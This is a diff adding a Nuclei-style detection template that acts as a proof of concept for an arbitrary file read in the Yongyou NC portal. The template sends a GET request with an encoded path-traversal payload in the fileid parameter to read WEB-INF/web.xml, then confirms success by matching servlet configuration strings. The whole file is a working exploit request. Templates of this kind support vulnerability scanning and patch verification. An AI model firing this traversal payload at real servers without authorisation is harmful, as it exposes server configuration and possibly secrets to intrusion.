@@ -1,0 +1,21 @@
+id: poc-yaml-yongyou-nc-portal-file-anyfile-read
+info:
+  name: Yongyou NC Portal File Arbitrary Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<welcome-file>index.jsp</welcome-file>"
+          - "<servlet-mapping>"
